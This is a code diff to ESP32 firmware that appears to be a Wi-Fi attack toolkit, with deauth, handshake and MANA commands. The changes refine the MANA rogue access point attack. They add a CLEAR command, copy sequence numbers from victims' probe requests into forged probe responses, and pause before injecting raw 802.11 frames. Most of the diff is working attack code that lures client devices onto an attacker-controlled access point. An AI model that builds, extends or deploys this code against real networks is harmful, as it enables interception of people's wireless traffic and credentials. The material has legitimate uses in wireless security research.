@@ -581,7 +581,7 @@ int cmd_deauth(int argc, char **argv) {
  */
 int cmd_mana(int argc, char **argv) {
     if (argc > 3) {
-        ESP_LOGE(TAG, "Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
+        ESP_LOGE(TAG, "Usage: mana ( CLEAR | ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
         return ESP_ERR_INVALID_ARG;
     }
     /* Start hopping task loop if hopping is on by default */
@@ -601,7 +601,7 @@ int cmd_mana(int argc, char **argv) {
         } else if (argc == 3 && (!strcasecmp(argv[2], "ON") || !strcasecmp(argv[2], "OFF"))) {
             attack_status[ATTACK_MANA_VERBOSE] = strcasecmp(argv[2], "OFF");
         } else {
-            ESP_LOGE(MANA_TAG, "Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
+            ESP_LOGE(MANA_TAG, "Usage: mana ( CLEAR | ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
             return ESP_ERR_INVALID_ARG;
         }
     } else if (!strcasecmp(argv[1], "OFF") || !strcasecmp(argv[1], "ON")) {
@@ -621,7 +621,7 @@ int cmd_mana(int argc, char **argv) {
                 mana_auth = AUTH_TYPE_WPA;
             }
         } else {
-            ESP_LOGE(MANA_TAG, "Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
+            ESP_LOGE(MANA_TAG, "Usage: mana ( CLEAR | ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
             return ESP_ERR_INVALID_ARG;
         }
     } else if (!strcasecmp(argv[1], "LOUD")) {
@@ -640,18 +640,10 @@ int cmd_mana(int argc, char **argv) {
                 cmd_mana(2, manaArgs);
             }
         } else {
-            ESP_LOGE(MANA_TAG, "Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
+            ESP_LOGE(MANA_TAG, "Usage: mana ( CLEAR | ( [ VERBOSE ] [ ON | OFF ] ) | ( AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
             return ESP_ERR_INVALID_ARG;
         }
-    } else {
-        ESP_LOGE(MANA_TAG, "Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
-        return ESP_ERR_INVALID_ARG;
-    }
-
-    /* Disable channel hopping if we enabled it */
-    if (!attack_status[ATTACK_MANA]) {
-        args[1] = "off";
-        cmd_hop(2, args);
+    } else if (!strcasecmp(argv[1], "clear")) {
         /* Clean up networkList */
         for (int i = 0; i < networkCount; ++i) {
             if (networkList[i].ssidCount > 0) {
@@ -659,6 +651,15 @@ int cmd_mana(int argc, char **argv) {
             }
         }
         free(networkList);
+    } else {
+        ESP_LOGE(MANA_TAG, "Usage: mana ( CLEAR | ( [ VERBOSE ] [ ON | OFF ] ) | AUTH [ NONE | WEP | WPA ] ) | ( LOUD [ ON | OFF ] ) )");
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    /* Disable channel hopping if we enabled it */
+    if (!attack_status[ATTACK_MANA]) {
+        args[1] = "off";
+        cmd_hop(2, args);
     }
     return ESP_OK;
 }
@@ -1007,7 +1008,7 @@ int cmd_handshake(int argc, char **argv) {
     return ESP_OK;
 }
 
-esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType) {
+esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType, uint16_t seqNum) {
     uint8_t *probeBuffer;
 
     #ifdef DEBUG_VERBOSE
@@ -1071,7 +1072,16 @@ esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, e
     }
     memcpy(&probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], bAuthType, 2);
 
-    #ifdef DEBUG
+    /* Decode, increment and recode seqNum */
+    uint16_t seq = seqNum >> 4;
+    ++seq;
+    uint16_t newSeq = seq << 4 | (seq & 0x000f);
+    uint8_t finalSeqNum[2];
+    finalSeqNum[0] = (newSeq & 0x00FF);
+    finalSeqNum[1] = (newSeq & 0xFF00) >> 8;
+    memcpy(&probeBuffer[PROBE_SEQNUM_OFFSET], finalSeqNum, 2);
+
+    #ifdef DEBUG_VERBOSE
         char debugOut[1024];
         int debugLen=0;
         strcpy(debugOut, "SSID: \"");
@@ -1094,13 +1104,17 @@ esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, e
         mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], strMac);
         strncpy(&debugOut[debugLen], strMac, strlen(strMac));
         debugLen += strlen(strMac);
-        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
+        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
         debugLen += strlen("\tAuthType: \"0x 0x\"\n") + 4;
+        sprintf(&debugOut[debugLen], "\tSeqNum: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_SEQNUM_OFFSET], probeBuffer[PROBE_SEQNUM_OFFSET+1]);
+        debugLen += strlen("\tSeqNum: \"0x 0x\"\n") + 4;
         debugOut[debugLen] = '\0';
         printf("About to transmit %s\n", debugOut);
     #endif
 
     // Send the frame
+    /* Pause first */
+    vTaskDelay(1);
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_response_raw) + strlen(ssid), false);
     free(probeBuffer);
     return e;
@@ -1174,6 +1188,10 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                 return;
             }
 
+            /* Get sequence number */
+            uint16_t seqNum = 0;
+            seqNum = ((uint16_t)payload[PROBE_SEQNUM_OFFSET + 1] << 8) | payload[PROBE_SEQNUM_OFFSET];
+
             if (ssid_len == 0) {
                 /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
                 #ifdef DEBUG
@@ -1213,7 +1231,7 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                                 #ifdef DEBUG
                                     ESP_LOGI(MANA_TAG, "Sending probe response to %s for \"%s\"", strDestMac, networkList[i].ssids[j]);
                                 #endif
-                                send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], mana_auth);
+                                send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], mana_auth, seqNum);
                             }
                         }
                     }
@@ -1305,7 +1323,7 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                 }
 
                 /* Send probe response */
-                send_probe_response(bCurrentMac, bDestMac, ssid, mana_auth);
+                send_probe_response(bCurrentMac, bDestMac, ssid, mana_auth, seqNum);
             }
         }
         free(ssid);
